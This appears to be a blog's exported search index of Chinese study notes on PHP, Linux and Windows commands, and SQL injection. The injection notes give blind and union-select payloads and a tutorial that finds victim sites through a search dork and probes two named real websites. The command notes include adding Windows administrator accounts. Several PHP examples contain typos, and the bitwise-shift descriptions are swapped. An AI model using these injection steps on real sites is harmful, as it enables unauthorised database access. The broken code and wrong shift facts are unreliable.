    <url>%2F2018%2F10%2F25%2Fphp%E9%80%92%E5%BD%92%2F</url>
    <content type="text"><![CDATA[什么是php递归函数？递归函数即自动调用函数，在函数体内部直接或者间接的自己调用自己，即函数的嵌套调用是函数本身。通常在此类型的函数题之中会附加一个条件判断叙述，以判断是否需要执行递归调用，并且在特定的条件下终止函数的递归调用动作，把目前流程的主控制权回到上一层函数来执行。从此，当某个执行递归调用的函数没有附加条件判断叙述时，可能会造成无限循环的错误情形。函数递归调用最大的好处在于可以精简程序中的复杂重复调用程序，并且能以这种特性来执行一些较为复杂的运算动作。例如，列表、动态树形菜单及遍历目录等操作。相应的非递归函数虽然效率高，但却比较难编程，而且相对来说可读性差。现代程序设计的目标主要是可读性好。随着计算机硬件性能的不断提高，程序在更多的场合优先考虑可读而不是高效，所以，鼓励用递归函数实现程序思想。一个简单的递归调用实例如下所示: 12345678910111213&lt;?php//声明一个函数，用于测试递归function test($n)&#123; echo $n." "; //在函数开始输出参数的值 if($n&gt;0)&#123; //判断参数是否大于0 test($n-1); //如果参数大于0则调用自己，并将参数减1后再次传入 &#125;else&#123; //判断参数是不大于0 echo "&lt;----------&gt; "; &#125; echo $n." ";&#125;test(10); //调用test函数将整数10传给参数?&gt; 输出结果： 10 9 8 7 6 5 4 3 2 1 0 &lt;---------&gt; 0 1 2 3 4 5 6 7 8 9 10 说明：在上面的实例中声明了一个test()函数，该函数需要一个整型的参数。在函数外面通过传递整数10作为参数调用test()函数。在test()函数体中，第一条代码输出参数的值和一个空格。然后判断条件是否成立，成立则调用自己并将参数减1，再次传入。开始调用时，它是外层调内层，内层调更内一层，直到最内层由于条件不允许必须结束。最内层结束了。输出作为分界符，执行调用之后的代码输出参数的值和空格，它就会回到稍外一层继续执行。稍外一层在结束时，退回到在稍外一层继续执行，层层推出，直到最外层结束。执行完成以后的结果就是我们上面看到的结果。]]></content>
      <tags>
        <tag>php学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php常量]]></title>
    <url>%2F2018%2F10%2F25%2Fphp%E5%B8%B8%E9%87%8F%2F</url>
    <content type="text"><![CDATA[php常量1.常量：一旦声明，这个常量的值就不会被改变 2.如果常量没有声明，则常量名在使用时，会自动转为字符串（效率很低） 3.常量名称，不要加$符号 4.常量名称，默认是区分大小写的（变量也区分大小写），习惯上常量名称要全部大写 5.可以使用define()第三个参数来决定是否让这个常量名称区分大小写 true false。例如：define(&quot;QA&quot;,123,true); 6.常量的值只支持标量数据类型（整型，浮点型，字符型...,数组不是标量数据类型）]]></content>
      <tags>
        <tag>php学习</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2F2018%2F10%2F25%2Fphp%E8%A1%A8%E5%8D%95%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[php变量函数]]></title>
    <url>%2F2018%2F10%2F25%2Fphp%E5%8F%98%E9%87%8F%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[php变量函数php支持变量函数的概念。这意味着如果一个变量名后有圆括号，php将寻找与变量的值同名的函数，并且将尝试执行它。除了别的事情以外，这个可以被用于实现回调函数，函数表等等。变量函数不能用于语言结构，例如echo(),print(),unset(),isset(),empty(),include(),require()以及类似的语句。需要使用自己的外壳函数来将这些结构用作变量函数。 变量函数示例： 1234567891011121314151617181920212223&lt;?phpfunction foo()&#123; echo "In foo()&lt;br /&gt;\n";&#125;function bar($arg = '')&#123; echo "In bar();argument was '$arg'.&lt;br /&gt;\n";&#125;//This is a wrapper function around echofunction echoit($string)&#123; echo $string;&#125;$func = 'foo';$func(); //这里调用foo()$func = 'bar';$func('test'); //这里调用bar()$func = 'echoit';$func('test'); //这里调用echoit() 还可利用变量函数的特性来调用一个对象的方法。 变量方法范例： 1234567891011121314151617181920&lt;?phpclass Foo&#123; function Variable() &#123; $name = 'Bar'; $this-&gt;$name();//这是Bar()方法 &#125; functoin Bar() &#123; echo "这是Bar"; &#125;&#125;$foo = new Foo();$funcname = "Variable";$foo-&gt;$funcname(); //这是$foo-&gt;Variable()?&gt;]]></content>
      <tags>
        <tag>php学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php string函数]]></title>
    <url>%2F2018%2F10%2F25%2Fphp%20string%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[string函数1.chr() chr()函数从指定的ascii值返回字符。 2.strlen() 计算字符串的长度，如果是中文的字符则代表两个长度。 3.trim() 去除字符串的两边空格。 4.strtolower() 把字符串转换为小写。 5.strtoupper() 把字符串转换为大写。 6.htmlspecialchars() 把特殊字符转换为HTML编码。 7.strrev() 反转字符。 8.strpos() 找出字符第一次出现的位置，下标从0开始，区分大小写strpos(&apos;字符串&apos;，要找的字符) mixed strpos ( string $haystack , mixed $needle [, int $offset = 0 ] ) 返回 needle 在 haystack 中首次出现的数字位置。 9.stristr() 不区分大小写，找到指定字符的位置，然后，进行截取，一直截取到末尾，包括字符本身 10.strrchr() 找到字符最后出现的位置，区分大小写，并截取到末尾 11.str_replace() 字符串替换函数。 12.substr() 截取字符串函数 substr(&apos;字符串&apos;,开始位置，结束位置) 如果结束位置没有填写，则默认截取的结尾 13.join() 把数组连接成为字符串]]></content>
      <tags>
        <tag>php学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sql盲注笔记]]></title>
    <url>%2F2018%2F10%2F25%2Fmysql%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[基于布尔sql盲注———构造逻辑判断截取字符串相关函数： left(database(),1)&gt;’s’ //left()函数Explain：database()显示数据库名称，left(a,b)从左侧截取a的前b位 ascii(substr((select table_name information_schema.tables where table_schema=database() limit 0,1),1,1))=101 –+ //substr()函数，ascii()函数Explain:substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。ascii()将某个字符转换为ascii值。 ascii(substr((select database()),1,1))=98 ord(mid((select ifnull(cast(username as char),0x20) from security.users order by id limit 0,1),1,1))&gt;98%23 //ord()函数，mid()函数Explain:mid(a,b,c)从位置b开始，截取a字符串的c位 ord()函数同ascii()，将字符转为ascii值。 regexp 正则注入用法介绍：select user() regexp ‘^[a-z]’;Explain:正则表达式的用法，user()结果为root，regexp为匹配root的正则表达式。第二位可以用select user() regexp ‘^ro’来进行。当正确的时候显示结果为1，不正确的时候显示结果为0.]]></content>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux命令详解]]></title>
    <url>%2F2018%2F10%2F25%2Flinux%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[linux命令详解linux命令的通用格式命令 [选项] [参数] 选项及参数的含义：选项：用于调节命令的功能 &gt;以&quot;-&quot;引导短格式选项（单个字符），例如&quot;-l&quot; &gt;以&quot;--&quot;引导长格式选项（多个字符），例如&quot;--color&quot; &gt;多个短格式选项可以写在一起，只用一个&quot;-&quot;引导，例如&quot;-al&quot; 参数：命令操作的对象，如文件，目录名等。例如&quot;ls -l /home 命令行编辑的几个辅助操作:反斜杠&quot;\&quot;;强制换行 快捷键 ctrl+U 清空至行首 ctrl+K 清空至行尾 ctrl+L 清屏 ctrl+C 取消本次命令编辑 ctrl+alt+F2 切换图形界面或命令行界面 --help 查看帮助 uname命令：-a 显示主机名，内核版本，硬件平台等详细信息。 -r 显示内核版本 hostname命令：查看主机名 关机命令：halt 关机 shutdown -h now 现在关机 poweroff 关机 shutdown -r 重启 reboot 重启 目录切换命令：cd 切换目录 pwd 查看当前所在目录 ls命令：列表显示目录内容 格式： ls [选项] .....[目录或文件名] 选项： -l 以长格式显示 -a 显示所有字目录和文件信息，包括隐藏文件 -A 类似于&quot;-a&quot;，但不显示&quot;.&quot;和&quot;..&quot;目录信息。 -d 显示目录本身的属性 -h 以更易读的字节单位（K,M 等）显示信息 -R 递归显示内容 --color 以颜色区分不同类型文件 du命令：统计目录及文件的空间占用情况 格式： du [选项].....[目录或文件名] 选项： -a 统计时包括所有的文件，而不仅仅只统计目录 -h 以更易读的字节单位（K,M 等）显示信息 -s 只统计每个参数所占用空间总大小。 mkdir命令：创建新的目录 格式： mkdir [-p] [路径] 目录名 touch命令：创建文件，或更新文件的时间标记 格式： touch 文件名 ln命令：为文件或目录建立链接。Link 格式： ln [-s] 源文件或目录....链接文件或目标目录 选项： -s 建立符号链接文件（省略此项建立硬链接） cp命令：复制 文件或目录 格式： cp [选项] 源文件或目录....目标文件或目录 选项： -r 递归复制整个目录树 -p 保持源文件的属性不变 -f 强制覆盖目标同名文件或目录 -i 需要覆盖文件或目录时进行提醒 rm命令：删除 文件或目录 格式： rm [选项]... 文件或目录 选项： -f 强行删除文件或目录，不进行提醒 -i 删除文件或目录时提醒用户确认 -r 递归删除整个目录树 防火墙命令：1) Linux操作系统中永久性生效，重启后不会复原 开启： chkconfig iptables on 关闭： chkconfig iptables off 2) 即时生效，重启后复原 开启： service iptables start 关闭： service iptables stop 需要说明的是对于Linux操作系统中的其它服务都可以用以上命令执行开启和关闭操作。 在开启了防火墙时，做如下设置，开启相关端口， 修改/etc/sysconfig/iptables 文件，添加以下内容： -A RH-Firewall-1-INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT -A RH-Firewall-1-INPUT -m state --state NEW -m tcp -p tcp --dport 22 -j ACCEPT]]></content>
      <categories>
        <category>命令学习</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[正则表达式]]></title>
    <url>%2F2018%2F10%2F25%2F%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[表示字符 字符 功能 . 匹配任意1个字符（除了\n） [] 匹配[]中列举的字符 \d 匹配数字，即0-9 \D 匹配非数字，既不是数字 \s 匹配空白，即空格，tab键 \S 匹配非空白 \w 匹配单词字符，即a-z,A-Z,0-9,_ \W 匹配非单词字符]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[命令行中执行php代码，传递参数]]></title>
    <url>%2F2018%2F10%2F25%2F%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%AD%E6%89%A7%E8%A1%8Cphp%E4%BB%A3%E7%A0%81%2F</url>
    <content type="text"><![CDATA[命令行中执行php代码，传递参数 $_GET和$_POST用来获取http提交的参数，不能获取命令行提交的参数。通过命令行传递数 通过$argv获取参数的值，$argc用来获取传递参数的个数。]]></content>
      <tags>
        <tag>php学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows命令]]></title>
    <url>%2F2018%2F10%2F25%2Fwindows%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[windows命令windows常用快捷键：F1 显示当前程序或者windows的帮助内容 F2 当你选中一个文件的话，这意味着“重命名” F3 当你在桌面上的时候是打开“查找：所有文件”对话框 ctrl+F4 关闭当前应用程序中的当前文本 F5 刷新 ctrl+F5 强行刷新 ctrl+F6 切换到当前 ipconfig命令：ipconfig /release------释放IP ipconfig /renew--------重新获取IP 目录（文件）操作： md 目录名------------创建目录 rd 目录名------------删除文件夹 ren 原文件名 新文件名---------重命名 del 文件名或目录名------------删除文件或文件夹 copy ------------------------复制文件 move ------------------------移动文件 tree ------------------------树形列出文件夹结构 type ------------------------打开文件 start -----------------------打开文件或网站 conpy con c:\123.txt ----创建一个123.txt，ctrl+z退出写入 net start命令：net start---------查看开启了哪些服务 net start 服务名---开启特定服务 net stop 服务名 ---关闭特定服务 net user命令：net user 用户名 密码 /add-------------------建立用户 net user guest /active:yes-----------------激活guest用户 net user-----------------------------------查看有哪些用户 net user 账户名-----------------------------查看账户属性 net locaLGroup administrators 用户名 /add---把“用户名”添加到管理员中使其具有管理员权限 net user guest 12345-----------------------用guest用户登录后，将密码改为12345 net password 密码--------------------------更改系统登录密码 win键+R 【输入内容】cmd------------------命令窗口 mstsc----------------远程桌面连接窗口 gpedit.msc-----------打开本地组策略 services.msc---------打开服务窗口 notepad--------------打开记事本 regedit--------------打开注册表 control--------------打开控制面板]]></content>
      <categories>
        <category>命令学习</category>
      </categories>
      <tags>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sql注入]]></title>
    <url>%2F2018%2F10%2F25%2Fsql%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[【一、SQL注入原理】1.锁定目标 在浏览器的搜索框中输入：公司 inurl asp?id=，然后点击搜索按钮，会列出所有asp相关的网站信息，从中选取一个 这里我们选取http://www.zhjzg.com/ship.asp?id=4 2.将上述目标地址粘贴到浏览器的地址栏中打开，然后在其后面加上一个单引号，如下： http://www.zhjzg.com/ship.asp?id=4‘ 回车之后，会发现页面显示错误如下： Microsoft OLE DB Provider for ODBC Drivers error &apos;80040e14&apos; [Microsoft][ODBC Microsoft Access Driver] Syntax error in string in query expression &apos;shipline.id=ship.shiplineid and shipline.groundid=ground.id and ground.id=4&apos; order by shiptime&apos;./ship.asp, line 107 从上面这段错误，我们可以看出以下几点内容： （1）网站使用的是Access数据库，通过ODBC连接数据库。 （2）程序没有判断客户端提交的数据是否符合程序要求。 （3）该SQL语句所查询的表中有一名为ID的字段。 从上面的例子我们可以知道，ＳＱＬ注入的原理，就是从客户端提交特殊的代码，从而收集程序及服务器的信息，从而获取你想到得到的资料。 【二、判断是否可以进行SQL注入】看完第一节，是否感觉SQL注入测试不是很简单吗？其实，这并不是最好的方法，为什么呢？ 首先，不一定每台服务器的IIS都返回具体错误提示给客户端，如果程序中加了cint(参数)之类语句的话，ＳＱＬ注入是不会成功的，但服务器同样 会报错，具体提示信息为处理 URL 时服务器上出错。请和系统管理员联络。 其次，部分对ＳＱＬ注入有一点了解的程序员，认为只要把单引号过滤掉就安全了，这种情况不为少数，如果你用单引号测试，是测不到注入点的 那么，什么样的测试方法才是比较准确呢？答案如下： ① http://www.wenkuxiazai.com/showdetail.asp?id=49 ② http://www.wenkuxiazai.com/showdetail.asp?id=49 and 1=1 ③ http://www.wenkuxiazai.com/showdetail.asp?id=49 and 1=2 这就是经典的1=1、1=2测试法了，怎么判断呢？看看上面三个网址返回的结果就知道了： 可以注入的表现： ① 正常显示（这是必然的，不然就是程序有错误了） ② 正常显示，内容基本与①相同 ③ 提示BOF或EOF（程序没做任何判断时）、或提示找不到记录（判断了rs.eof时）、或显示内容为空（程序加了on error resume next） 不可以注入就比较容易判断了 ①同样正常显示 ②和③一般都会有程序定义的错误提示，或提示类型转换时出错。 当然，这只是传入参数是数字型的时候用的判断方法，实际应用的时候会有字符型和搜索型参数，我将在中级篇的“ＳＱＬ注入一般步骤”再做分析。 【三、判断数据库类型及注入方法】不同的数据库的函数、注入方法都是有差异的，所以在注入之前，我们还要判断一下数据库的类型。一般ASP最常搭配的数据库是Access和 SQLServer，网上超过99%的网站都是其中之一。 怎么让程序告诉你它使用的什么数据库呢？来看看： &lt;途径一：直接从出错信息获取&gt; SQLServer有一些系统变量，如果服务器IIS提示没关闭，并且SQLServer返回错误提示的话，那可以直接从出错信息获取，方法如下： http://www.wenkuxiazai.com/showdetail.asp?id=49 and user&gt;0 它的含义： 首先，前面的语句是正常的，重点在and user&gt;0，user是SQLServer的一个内置变量，它的值是当前连接的用户名，类型为nvarchar。 然后，拿一个nvarchar的值跟int的数0比较，系统会先试图将nvarchar的值转成int型，当然，转的过程中肯定会出错，SQLServer的出错提示 是：将nvarchar值 ”abc” 转换数据类型为 int 的列时发生语法错误，abc正是变量user的值 这样，不废吹灰之力就拿到了数据库的用户名 顺便说几句，众所周知，SQLServer的用户sa是个等同Adminstrators权限的角色，拿到了sa权限，几乎肯定可以拿到主机的Administrator了。 上面的方法可以很方便的测试出是否是用sa登录，要注意的是：如果是sa登录，提示是将”dbo”转换成int的列发生错误，而不是”sa”。 &lt;途径二：从数据库系统表的判断入手&gt; 如果服务器IIS不允许返回错误提示，那怎么判断数据库类型呢？ 首先，我们可以从Access和SQLServer和区别入手，Access和SQLServer都有自己的系统表，比如存放数据库中所有对象的表，Access是在系统表 [msysobjects]中，但在Web环境下读该表会提示“没有权限”，SQLServer是在表[sysobjects]中，在Web环境下可正常读取。 然后在确认可以注入的情况下，使用下面的语句： http://www.wenkuxiazai.com/showdetail.asp?id=49 and (select count(*) from sysobjects)&gt;0 http://www.wenkuxiazai.com/showdetail.asp?id=49 and (select count(*) from msysobjects)&gt;0 结果分析： 如果数据库是SQLServer，那么第一个网址的页面与原页面http://www.wenkuxiazai.com/showdetail.asp?id=49是大致相同的； 而第二个网址，由于找不到表msysobjects，会提示出错，就算程序有容错处理，页面也与原页面完全不同。 如果数据库用的是Access，那么情况就有所不同，第一个网址的页面与原页面完全不同； 第二个网址，则视乎数据库设置是否允许读该系统表，一般来说是不允许的，所以与原网址也是完全不同。 大多数情况下，用第一个网址就可以得知系统所用的数据库类型，第二个网址只作为开启IIS错误提示时的验证。]]></content>
      <categories>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php+mysql注入]]></title>
    <url>%2F2018%2F10%2F25%2Fphp%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[php+mysql（5.0以上）注入 1.判断注入点 2.猜解字段数 3.猜数据库名 4.猜表名 5.猜列名 6.猜数据 注入语句: http://127.0.0.1/wl13/sql.php?x=1 union select 1,2,3 查询信息： http://127.0.0.1/wl13/sql.php?x=1%20union%20select%20database(),version(),user() 注入函数： 数据库名 database() 数据库版本 version() 数据库用户 user() 操作系统 @@version_compile_os Mysql5.0 注入（有根据） 数据库中“.”代表下一级 Information_schema： mysql5.0及以上版本自带数据库，存储有mysql所有数据库下的表名及列名信息 Information_schema.tables：存储所有表名信息的表 Table_name：表名 table_schema：数据库名 Column_name：列名 information_schema.columns：存储所有列名信息的表]]></content>
      <categories>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>mysql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php位运算]]></title>
    <url>%2F2018%2F10%2F25%2Fphp%E4%BD%8D%E8%BF%90%E7%AE%97%2F</url>
    <content type="text"><![CDATA[php位运算&amp; 换位与 只有参与运算的两位都为1时，运算结果才为1，否则为0 $a &amp; $b | 换位或 只有参与运算的两位都为0时，运算结果才为0，否则为1. $a &amp; $b ^ 换位异或 只有参与运算的两位不同，运算结果才为1，否则为0 ^$b ~ 按位非 将用二进制表示的操作中的1变成0,0变成1 ~$a &lt;&lt; 左移 将左边的操作数在内存中的二进制数据右移右边操作数指定的位数，右边移空的部分补上0 $a&lt;&lt;$b &gt;&gt; 右移 将左移的操作数在内存中的二进制数据左移右边操作数指定的位数。左边移空的部分补上0 $a&gt;&gt;$b]]></content>
      <tags>
        <tag>php学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php匿名函数]]></title>
    <url>%2F2018%2F10%2F25%2Fphp%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[php匿名函数 匿名函数。也叫闭包函数，允许临时创建一个没有指定名称的函数。最经常用作回调函数参数的值。当然，也有其他应用的情况。 匿名函数目前是通过Closure类来实现的。 匿名函数示例： 123456&lt;?php echo preg_repllace_callback('~-([a-z])~', function($match)&#123; return strtoupper($match[1]);&#125;,'hello-world');//输出 helloworld?&gt; 闭包函数也可以作为变量的值来使用。php会自动把此种表达式转换成内置类Closure的对象实例。把一个Closure对象赋值给一个变量的方式与普通变量赋值的语法是一样的，最后也要加上分号： 匿名函数变量赋值示例： 123456789&lt;?php$gree = function($name);&#123; print("Hello %s\r\n", $name);&#125;;$greet('World');$greet('PHP');?&gt; 闭包可以从父作用域中继承变量。任何此类变量都应该用use语言结构传递进去。php7.1起，不能传入此类变量；superglobals、$this或者和参数重名。 从父作用域继承变量： 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php$message = 'hello';//没有"use"$example = function ()&#123; var_dump($message);&#125;;echo $example();//继承$message$example = function () use ($message)&#123; var_dump($message);&#125;;echo $example();// Inherited variable's value is from when the function// is defined, not when called$message = 'world';echo $example();// Reset message$message = 'hello';// Inherit by-reference$example = function () use (&amp;$message) &#123; var_dump($message);&#125;;echo $example();// The changed value in the parent scope// is reflected inside the function call$message = 'world';echo $example();// Closures can also accept regular arguments$example = function ($arg) use ($message) &#123; var_dump($arg . ' ' . $message);&#125;;$example("hello");?&gt; 以上例子的输出类似于： Notice: Undefined variable: message in /example.php on line 6 NULL string(5) &quot;hello&quot; string(5) &quot;hello&quot; string(5) &quot;hello&quot; string(5) &quot;world&quot; string(11) &quot;hello world&quot;]]></content>
      <tags>
        <tag>php学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php魔术常量]]></title>
    <url>%2F2018%2F10%2F25%2Fphp%E9%AD%94%E6%9C%AF%E5%B8%B8%E9%87%8F%2F</url>
    <content type="text"><![CDATA[php魔术变量 php向它运行的任何脚本提供了大量的预定义常量 不过很多常量都是由不同的扩展库定义的，只有在加载了这些扩展库时才会出现，或者动态加载后，或者在编译时已经包括进去了。 有八个魔术常量它们的值随着它们在代码中的位置改变而改变。 例如：LINE的值就依赖于它在脚本中所处的行来决定。这些特殊的常量不区分大小写，如下： LINE__LINE__文件中的当前行号。 实例 &lt;?php echo &apos;这是第 &quot;&apos; . __LINE__ . &apos; &quot;行&apos;; ?&gt; 以上实例输出结果为： 这是第 &quot;2&quot; 行 FILE __FILE__ 文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名。 自php 4.0.2起，FILE总是包含一个绝对路径（如果是符号连接，则是解析后的绝对路径），而在此之前的版本有时会包含一个相对路径。 实例 &lt;?php echo &apos;该文件位于 &quot;&apos; .__FILE__. &apos; &quot;&apos;; ?&gt; 以上实例输出结果为： 该文件位于 &quot;E:\wamp\www\test\index.php&quot; DIR__DIR__ 文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录。 它等价于dirname(FILE)。除非是根目录，否则目录中名不包括末尾斜杠。（php 5.3.0中新增） 实例 &lt;?php echo &apos;该文件位于 &quot;&apos; .__DIR__.&apos;&quot; &apos;; ?&gt; 以上实例输出结果为： 该文件位于 &quot;E:\wamp\www\test&quot; FUNCTION__FUNCTION__函数名称（php 4.3.0新加）。自php5 起本常量返回该函数被定义时的名字（区分大小写）。在php4 中该值总是小写字母的。 实例 &lt;?php function test(){ echo &apos;函数名为：&apos; .__FUNCTION__; } test(); ?&gt; 以上实例输出结果为： 函数名为：test]]></content>
      <tags>
        <tag>php学习</tag>
      </tags>
  </entry>
</search>
